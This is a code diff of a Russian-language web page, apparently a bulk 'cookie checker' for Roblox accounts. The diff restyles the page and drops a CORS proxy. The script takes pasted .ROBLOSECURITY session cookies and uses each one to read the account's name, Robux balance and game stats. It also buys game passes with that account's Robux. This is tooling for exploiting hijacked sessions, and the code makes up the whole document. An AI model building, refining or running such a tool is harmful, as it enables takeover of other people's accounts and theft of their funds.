@@ -10,18 +10,22 @@
             padding: 0;
             box-sizing: border-box;
         }
-
+        html {
+            overflow-y: auto !important;
+            height: 100%;
+        }
         body {
             font-family: 'Segoe UI', system-ui, sans-serif;
             background: #0a0e0a;
             min-height: 100vh;
+            min-height: 100dvh;
             display: flex;
             justify-content: center;
-            align-items: center;
-            overflow: hidden;
+            align-items: flex-start;
+            padding: 1.5rem 1rem 4rem;
+            overflow-y: auto !important;
             position: relative;
         }
-
         .bg {
             position: fixed;
             inset: 0;
@@ -31,7 +35,6 @@
                 radial-gradient(ellipse at 75% 70%, rgba(0, 180, 60, 0.05) 0%, transparent 45%),
                 linear-gradient(145deg, #080c08 0%, #0d180d 50%, #080c08 100%);
         }
-
         .particles {
             position: fixed;
             inset: 0;
@@ -42,72 +45,55 @@
         .particle {
             position: absolute;
             border-radius: 50%;
-            background: radial-gradient(circle, rgba(0, 255, 120, 0.08), transparent 70%);
+            background: radial-gradient(circle, rgba(0, 255, 120, 0.06), transparent 70%);
             animation: floatParticle 18s infinite alternate ease-in-out;
         }
         .particle:nth-child(1) { width: 180px; height: 180px; top: 5%; left: 3%; animation-duration: 20s; }
         .particle:nth-child(2) { width: 120px; height: 120px; top: 55%; right: 3%; animation-duration: 24s; animation-delay: 2s; }
         .particle:nth-child(3) { width: 80px; height: 80px; bottom: 8%; left: 35%; animation-duration: 16s; animation-delay: 4s; }
-
         @keyframes floatParticle {
             0%   { transform: translate(0, 0) scale(1); opacity: 0.2; }
             100% { transform: translate(50px, -70px) scale(1.6); opacity: 0.7; }
         }
-
         .main {
             position: relative;
             z-index: 1;
             width: 100%;
             max-width: 860px;
-            padding: 2rem 1.5rem;
             display: flex;
             flex-direction: column;
             align-items: center;
             min-height: 100vh;
-            justify-content: center;
+            min-height: 100dvh;
+            padding-top: 0.5rem;
+            padding-bottom: 3rem;
         }
-
-        /* ===== ЗАГОЛОВОК — ПО ЦЕНТРУ, ПОТОМ НАВЕРХ ===== */
         .header {
             text-align: center;
             width: 100%;
-            position: fixed;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            z-index: 10;
-            transition: all 1.2s cubic-bezier(0.16, 1, 0.3, 1);
+            margin-bottom: 1.5rem;
+            opacity: 0;
+            transform: translateY(-20px) scale(0.95);
+            animation: headerFadeIn 1s cubic-bezier(0.16, 1, 0.3, 1) 0.3s forwards;
         }
-
-        .header.moved {
-            position: relative;
-            top: 0;
-            left: 0;
-            transform: none;
-            margin-bottom: 2rem;
-            z-index: 1;
+        @keyframes headerFadeIn {
+            0%   { opacity: 0; transform: translateY(-20px) scale(0.95); }
+            100% { opacity: 1; transform: translateY(0) scale(1); }
         }
-
-        /* ===== ЛОГОТИП С ЭФФЕКТОМ ПЕЧАТИ ===== */
+        /* ===== НАЗВАНИЕ — БЕЛЫМ ЦВЕТОМ ===== */
         .logo {
-            font-size: 4.5rem;
+            font-size: 4.2rem;
             font-weight: 900;
             letter-spacing: 3px;
-            background: linear-gradient(135deg, #80ffa0, #00cc44, #40ff80);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            background-clip: text;
+            color: #ffffff;
             display: inline-block;
-            opacity: 0;
-            transform: scale(0.8);
-            animation: logoIn 0.8s cubic-bezier(0.16, 1, 0.3, 1) 0.3s forwards;
+            text-shadow: 0 0 30px rgba(0, 255, 120, 0.15);
         }
-
         .logo span {
             display: inline-block;
             opacity: 0;
-            transform: translateY(40px) rotate(5deg) scale(0.5);
-            animation: letterPop 0.6s cubic-bezier(0.34, 1.56, 0.64, 1) forwards;
+            transform: translateY(30px) rotate(4deg) scale(0.6);
+            animation: letterPop 0.5s cubic-bezier(0.34, 1.56, 0.64, 1) forwards;
         }
         .logo span:nth-child(1) { animation-delay: 0.05s; }
         .logo span:nth-child(2) { animation-delay: 0.10s; }
@@ -119,51 +105,42 @@
         .logo span:nth-child(8) { animation-delay: 0.40s; }
         .logo span:nth-child(9) { animation-delay: 0.45s; }
         .logo span:nth-child(10) { animation-delay: 0.50s; }
-
         @keyframes letterPop {
-            0%   { opacity: 0; transform: translateY(40px) rotate(5deg) scale(0.5); }
+            0%   { opacity: 0; transform: translateY(30px) rotate(4deg) scale(0.6); }
             100% { opacity: 1; transform: translateY(0) rotate(0) scale(1); }
         }
-        @keyframes logoIn {
-            0%   { opacity: 0; transform: scale(0.8); }
-            100% { opacity: 1; transform: scale(1); }
-        }
-
         .logo-emoji {
-            font-size: 3.5rem;
-            -webkit-text-fill-color: initial;
+            font-size: 3.2rem;
+            color: #ffffff;
             background: none;
         }
-
         .underline {
-            width: 0%;
+            width: 60%;
             height: 3px;
-            margin: 0.6rem auto 0;
+            margin: 0.5rem auto 0;
             background: linear-gradient(90deg, transparent, #00cc44, #40ff80, #00cc44, transparent);
             border-radius: 4px;
-            animation: lineGrow 1.2s ease-out 1.2s forwards;
+            opacity: 0;
+            animation: lineGrow 1.2s ease-out 0.7s forwards;
         }
         @keyframes lineGrow {
             0%   { width: 0%; opacity: 0; }
             100% { width: 60%; opacity: 1; }
         }
-
         .subtitle {
-            color: #5a7a5a;
+            color: #8aaa8a;
             font-size: 0.8rem;
-            margin-top: 0.6rem;
+            margin-top: 0.5rem;
             opacity: 0;
-            animation: fadeUp 0.8s ease 1.6s forwards;
+            animation: fadeUp 0.8s ease 1s forwards;
             letter-spacing: 6px;
             text-transform: uppercase;
             font-weight: 300;
         }
         @keyframes fadeUp {
-            0%   { opacity: 0; transform: translateY(15px); }
+            0%   { opacity: 0; transform: translateY(12px); }
             100% { opacity: 1; transform: translateY(0); }
         }
-
-        /* ===== КАРТОЧКА ===== */
         .card {
             width: 100%;
             background: rgba(12, 22, 12, 0.85);
@@ -173,15 +150,14 @@
             padding: 2rem 1.8rem;
             box-shadow: 0 30px 80px rgba(0, 0, 0, 0.9);
             opacity: 0;
-            transform: translateY(50px);
-            animation: cardIn 0.8s cubic-bezier(0.16, 1, 0.3, 1) 2.2s forwards;
-            margin-top: 1rem;
+            transform: translateY(40px);
+            animation: cardIn 0.8s cubic-bezier(0.16, 1, 0.3, 1) 1.4s forwards;
+            margin-bottom: 2rem;
         }
         @keyframes cardIn {
-            0%   { opacity: 0; transform: translateY(50px); }
+            0%   { opacity: 0; transform: translateY(40px); }
             100% { opacity: 1; transform: translateY(0); }
         }
-
         .cookie-input-area {
             margin-bottom: 1.2rem;
         }
@@ -212,7 +188,6 @@
         .cookie-input-area textarea::placeholder {
             color: #4a6a4a;
         }
-
         .drop-zone {
             border: 2px dashed rgba(0, 255, 120, 0.15);
             border-radius: 18px;
@@ -245,7 +220,6 @@
         .drop-zone input {
             display: none;
         }
-
         .file-list {
             display: flex;
             flex-wrap: wrap;
@@ -278,7 +252,6 @@
             color: #ff9999;
             transform: scale(1.2);
         }
-
         .status {
             margin: 0.6rem 0 0.3rem;
             padding: 0.5rem 1rem;
@@ -290,7 +263,6 @@
             min-height: 2.4rem;
             transition: 0.3s;
         }
-
         .progress-wrap {
             margin: 0.5rem 0;
             height: 4px;
@@ -306,7 +278,6 @@
             border-radius: 4px;
             transition: width 0.3s ease;
         }
-
         .btn-group {
             display: flex;
             flex-wrap: wrap;
@@ -361,24 +332,22 @@
         .btn-success:hover {
             background: rgba(0, 200, 60, 0.25);
         }
-
         .result-container {
             width: 100%;
             margin-top: 1.2rem;
         }
-
         .cookie-card {
             background: rgba(0, 255, 80, 0.02);
             border: 1px solid rgba(0, 255, 120, 0.06);
             border-radius: 16px;
             padding: 1.2rem;
             transition: 0.3s;
+            margin-bottom: 1rem;
         }
         .cookie-card:hover {
             background: rgba(0, 255, 80, 0.05);
             border-color: rgba(0, 255, 120, 0.15);
         }
-
         .cookie-card .top-row {
             display: flex;
             align-items: center;
@@ -386,7 +355,6 @@
             margin-bottom: 0.8rem;
             flex-wrap: wrap;
         }
-
         .cookie-card .avatar {
             width: 56px;
             height: 56px;
@@ -404,7 +372,6 @@
             background: rgba(0, 255, 80, 0.05);
             color: #4a6a4a;
         }
-
         .cookie-card .user-info {
             flex: 1;
         }
@@ -426,7 +393,6 @@
             color: #ff6b6b;
             font-size: 0.9rem;
         }
-
         .games-grid {
             display: grid;
             grid-template-columns: repeat(auto-fill, minmax(180px, 1fr));
@@ -453,7 +419,6 @@
         .game-item .game-value.zero {
             color: #4a6a4a;
         }
-
         .cookie-preview {
             color: #3a5a3a;
             font-size: 0.5rem;
@@ -465,7 +430,6 @@
             text-overflow: ellipsis;
             white-space: nowrap;
         }
-
         .gamepass-section {
             margin-top: 1rem;
             padding-top: 1rem;
@@ -540,7 +504,6 @@
             border: 1px solid rgba(200, 50, 50, 0.20);
             color: #ff6b6b;
         }
-
         .proxy-status {
             font-size: 0.7rem;
             color: #4a6a4a;
@@ -567,7 +530,6 @@
         .proxy-status .dot.red {
             background: #ff6b6b;
         }
-
         @media (max-width: 560px) {
             .logo { font-size: 2.8rem; }
             .card { padding: 1.2rem; }
@@ -580,7 +542,6 @@
             .game-item { font-size: 0.65rem; }
             .cookie-input-area textarea { min-height: 40px; font-size: 0.75rem; }
         }
-
         @media (max-width: 400px) {
             .logo { font-size: 2.2rem; }
             .card { padding: 0.8rem; }
@@ -599,8 +560,7 @@
 
     <div class="main">
 
-        <!-- ===== ЗАГОЛОВОК С АНИМАЦИЕЙ ===== -->
-        <div class="header" id="header">
+        <div class="header">
             <div class="logo">
                 <span class="logo-emoji">🍪</span>
                 <span>К</span><span>у</span><span>к</span><span>и</span>
@@ -611,8 +571,7 @@
             <div class="subtitle">✦ ПРОВЕРКА АККАУНТОВ ROBLOX ✦</div>
         </div>
 
-        <!-- ===== КАРТОЧКА ===== -->
-        <div class="card" id="card">
+        <div class="card">
 
             <div class="cookie-input-area">
                 <label>📝 Вставьте куку текстом (или несколько, по одной на строку):</label>
@@ -650,12 +609,6 @@
     </div>
 
     <script>
-        // ===== АНИМАЦИЯ: ЗАГОЛОВОК ПОДНИМАЕТСЯ НАВЕРХ =====
-        setTimeout(() => {
-            document.getElementById('header').classList.add('moved');
-        }, 2200);
-
-        // ===== ОСНОВНАЯ ЛОГИКА =====
         (function() {
             'use strict';
 
@@ -677,7 +630,83 @@
             const resultContainer = document.getElementById('resultContainer');
             const proxyStatus = document.getElementById('proxyStatus');
 
-            const PROXY_URL = 'https://corsproxy.io/?url=';
+            // ===== ПРЯМОЙ ЗАПРОС К ROOBLOX API =====
+            async function checkCookieDirect(cookie) {
+                try {
+                    const response = await fetch('https://www.roblox.com/mobileapi/userinfo', {
+                        headers: {
+                            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+                            'Cookie': `.ROBLOSECURITY=${cookie}`
+                        }
+                    });
+
+                    if (!response.ok) {
+                        return { error: `HTTP ${response.status}`, userId: null, games: {} };
+                    }
+
+                    const data = await response.json();
+
+                    if (!data || data.error || !data.UserName) {
+                        return { error: 'Кука невалидна или истекла', userId: null, games: {} };
+                    }
+
+                    let games = {};
+                    try {
+                        const profileResp = await fetch(`https://www.roblox.com/users/${data.UserID || data.id}/profile`, {
+                            headers: {
+                                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+                                'Cookie': `.ROBLOSECURITY=${cookie}`
+                            }
+                        });
+                        if (profileResp.ok) {
+                            const html = await profileResp.text();
+                            games = parseGames(html);
+                        }
+                    } catch (e) {}
+
+                    return {
+                        displayName: data.UserName || data.displayName || data.name || 'Без имени',
+                        robux: data.RobuxBalance || data.robux || 0,
+                        userId: data.UserID || data.id || null,
+                        games: games
+                    };
+                } catch (err) {
+                    return { error: err.message || 'Ошибка запроса', userId: null, games: {} };
+                }
+            }
+
+            function parseGames(html) {
+                const games = {};
+                const patterns = [
+                    /Blox Fruits[:\s]+(\d+)/i,
+                    /Adopt Me[:\s]+(\d+)/i,
+                    /Murder Mystery[:\s]+(\d+)/i,
+                    /King Legacy[:\s]+(\d+)/i,
+                    /Toilet Tower Defense[:\s]+(\d+)/i,
+                    /Pet Simulator[:\s]+(\d+)/i,
+                    /Grand Piece Online[:\s]+(\d+)/i,
+                    /Blade Ball[:\s]+(\d+)/i,
+                    /Fisch[:\s]+(\d+)/i,
+                    /Volleyball Legends[:\s]+(\d+)/i,
+                    /Sailor Piece[:\s]+(\d+)/i,
+                    /Your Bizarre Adventure[:\s]+(\d+)/i,
+                    /Bee Swarm Simulator[:\s]+(\d+)/i,
+                    /Anime Vanguard[:\s]+(\d+)/i,
+                    /RIVALS[:\s]+(\d+)/i,
+                    /Tailbreak[:\s]+(\d+)/i,
+                    /Evade[:\s]+(\d+)/i,
+                    /Da Hood[:\s]+(\d+)/i,
+                    /Grow a Garden[:\s]+(\d+)/i,
+                ];
+                for (let pattern of patterns) {
+                    const match = html.match(pattern);
+                    if (match) {
+                        const name = match[0].replace(/[:\s]+\d+$/, '').trim();
+                        games[name] = parseInt(match[1], 10);
+                    }
+                }
+                return games;
+            }
 
             function extractCookies(text) {
                 const lines = text.split(/\r?\n/);
@@ -726,151 +755,6 @@
                     }
                 }
                 return found;
-            }
-
-            async function checkCookie(cookie) {
-                try {
-                    const url = 'https://www.roblox.com/mobileapi/userinfo';
-                    const fullUrl = `${PROXY_URL}${encodeURIComponent(url)}`;
-                    proxyStatus.innerHTML = `<span class="dot yellow"></span> ⏳ Проверка...`;
-
-                    const response = await fetch(fullUrl, {
-                        headers: {
-                            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
-                            'Cookie': `.ROBLOSECURITY=${cookie}`
-                        }
-                    });
-
-                    if (!response.ok) {
-                        proxyStatus.innerHTML = `<span class="dot red"></span> ❌ Ошибка HTTP ${response.status}`;
-                        return { error: `HTTP ${response.status}`, userId: null, games: {} };
-                    }
-
-                    const data = await response.json();
-
-                    if (!data || data.error || !data.UserName) {
-                        const htmlUrl = 'https://www.roblox.com/home';
-                        const htmlFullUrl = `${PROXY_URL}${encodeURIComponent(htmlUrl)}`;
-                        const htmlResp = await fetch(htmlFullUrl, {
-                            headers: {
-                                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
-                                'Cookie': `.ROBLOSECURITY=${cookie}`
-                            }
-                        });
-
-                        if (!htmlResp.ok) {
-                            return { error: 'Кука невалидна или истекла', userId: null, games: {} };
-                        }
-
-                        const html = await htmlResp.text();
-                        const displayName = extractName(html);
-                        const robux = extractRobux(html);
-                        const userId = extractUserId(html);
-
-                        if (!displayName && robux === null) {
-                            return { error: 'Кука невалидна или истекла', userId: null, games: {} };
-                        }
-
-                        const games = parseGames(html);
-                        proxyStatus.innerHTML = `<span class="dot green"></span> ✅ Успешно (HTML)`;
-
-                        return {
-                            displayName: displayName || 'Неизвестно',
-                            robux: robux !== null ? robux : 0,
-                            userId: userId || null,
-                            games: games
-                        };
-                    }
-
-                    let games = {};
-                    try {
-                        const profileUrl = `https://www.roblox.com/users/${data.UserID || data.id}/profile`;
-                        const profileFullUrl = `${PROXY_URL}${encodeURIComponent(profileUrl)}`;
-                        const profileResp = await fetch(profileFullUrl, {
-                            headers: {
-                                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
-                                'Cookie': `.ROBLOSECURITY=${cookie}`
-                            }
-                        });
-                        if (profileResp.ok) {
-                            const html = await profileResp.text();
-                            games = parseGames(html);
-                        }
-                    } catch (e) {}
-
-                    proxyStatus.innerHTML = `<span class="dot green"></span> ✅ Успешно (API)`;
-
-                    return {
-                        displayName: data.UserName || data.displayName || data.name || 'Без имени',
-                        robux: data.RobuxBalance || data.robux || 0,
-                        userId: data.UserID || data.id || null,
-                        games: games
-                    };
-                } catch (err) {
-                    proxyStatus.innerHTML = `<span class="dot red"></span> ❌ Ошибка: ${err.message}`;
-                    return { error: err.message || 'Ошибка запроса', userId: null, games: {} };
-                }
-            }
-
-            function extractName(html) {
-                const m = html.match(/"displayName":"([^"]+)"/i);
-                if (m) return m[1];
-                const m2 = html.match(/<span[^>]*display-name[^>]*>([^<]+)<\/span>/i);
-                if (m2) return m2[1].trim();
-                const m3 = html.match(/"name":"([^"]+)"/i);
-                if (m3) return m3[1];
-                return null;
-            }
-
-            function extractRobux(html) {
-                const m = html.match(/"robux":(\d+)/i);
-                if (m) return parseInt(m[1], 10);
-                const m2 = html.match(/>\s*(\d+)\s*<[^>]*icon-robux/i);
-                if (m2) return parseInt(m2[1], 10);
-                const m3 = html.match(/(\d+)\s*(?:R\$|Robux)/i);
-                if (m3) return parseInt(m3[1], 10);
-                return null;
-            }
-
-            function extractUserId(html) {
-                const m = html.match(/"userId":(\d+)/i);
-                if (m) return parseInt(m[1], 10);
-                const m2 = html.match(/"id":(\d+)/i);
-                if (m2) return parseInt(m2[1], 10);
-                return null;
-            }
-
-            function parseGames(html) {
-                const games = {};
-                const patterns = [
-                    /Blox Fruits[:\s]+(\d+)/i,
-                    /Adopt Me[:\s]+(\d+)/i,
-                    /Murder Mystery[:\s]+(\d+)/i,
-                    /King Legacy[:\s]+(\d+)/i,
-                    /Toilet Tower Defense[:\s]+(\d+)/i,
-                    /Pet Simulator[:\s]+(\d+)/i,
-                    /Grand Piece Online[:\s]+(\d+)/i,
-                    /Blade Ball[:\s]+(\d+)/i,
-                    /Fisch[:\s]+(\d+)/i,
-                    /Volleyball Legends[:\s]+(\d+)/i,
-                    /Sailor Piece[:\s]+(\d+)/i,
-                    /Your Bizarre Adventure[:\s]+(\d+)/i,
-                    /Bee Swarm Simulator[:\s]+(\d+)/i,
-                    /Anime Vanguard[:\s]+(\d+)/i,
-                    /RIVALS[:\s]+(\d+)/i,
-                    /Tailbreak[:\s]+(\d+)/i,
-                    /Evade[:\s]+(\d+)/i,
-                    /Da Hood[:\s]+(\d+)/i,
-                    /Grow a Garden[:\s]+(\d+)/i,
-                ];
-                for (let pattern of patterns) {
-                    const match = html.match(pattern);
-                    if (match) {
-                        const name = match[0].replace(/[:\s]+\d+$/, '').trim();
-                        games[name] = parseInt(match[1], 10);
-                    }
-                }
-                return games;
             }
 
             function getAvatarUrl(userId) {
@@ -1052,7 +936,7 @@
                         if (result.success) {
                             resultDiv.className = 'gamepass-result show success';
                             resultDiv.textContent = `✅ ${result.message}`;
-                            const newData = await checkCookie(cookie);
+                            const newData = await checkCookieDirect(cookie);
                             if (!newData.error) {
                                 const robuxSpan = card.querySelector('.robux');
                                 if (robuxSpan) {
@@ -1077,8 +961,7 @@
                     }
                     const passId = idMatch[1];
 
-                    const infoUrl = `${PROXY_URL}${encodeURIComponent(`https://www.roblox.com/game-pass/${passId}/`)}`;
-                    const infoResp = await fetch(infoUrl, {
+                    const infoResp = await fetch(`https://www.roblox.com/game-pass/${passId}/`, {
                         headers: {
                             'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                             'Cookie': `.ROBLOSECURITY=${cookie}`
@@ -1094,7 +977,7 @@
                     }
                     const price = parseInt(priceMatch[1], 10);
 
-                    const userData = await checkCookie(cookie);
+                    const userData = await checkCookieDirect(cookie);
                     if (userData.error) {
                         return { success: false, error: 'Не удалось проверить баланс' };
                     }
@@ -1106,13 +989,13 @@
                         };
                     }
 
-                    const buyUrl = `${PROXY_URL}${encodeURIComponent(`https://www.roblox.com/game-pass/${passId}/purchase`)}`;
-                    const buyResp = await fetch(buyUrl, {
+                    const buyResp = await fetch(`https://www.roblox.com/game-pass/${passId}/purchase`, {
                         method: 'POST',
                         headers: {
                             'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                             'Cookie': `.ROBLOSECURITY=${cookie}`,
-                            'Content-Type': 'application/json'
+                            'Content-Type': 'application/json',
+                            'X-CSRF-TOKEN': 'fetch'
                         },
                         body: JSON.stringify({})
                     });
@@ -1142,6 +1025,7 @@
                 results = [];
                 resultContainer.innerHTML = '';
                 exitBtn.style.display = 'none';
+                proxyStatus.innerHTML = `<span class="dot yellow"></span> ⏳ Проверка...`;
 
                 const total = cookies.length;
 
@@ -1150,11 +1034,16 @@
                     progressBar.style.width = `${((i + 1) / total) * 100}%`;
                     status.innerHTML = `⏳ Проверка ${i + 1}/${total}...`;
 
-                    const res = await checkCookie(cookie);
+                    const res = await checkCookieDirect(cookie);
                     results.push({ cookie, data: res });
 
                     if (i === 0) {
                         renderResults(res, cookie);
+                        if (res.error) {
+                            proxyStatus.innerHTML = `<span class="dot red"></span> ❌ Ошибка: ${res.error}`;
+                        } else {
+                            proxyStatus.innerHTML = `<span class="dot green"></span> ✅ Успешно!`;
+                        }
                     }
 
                     await new Promise(r => setTimeout(r, 500));
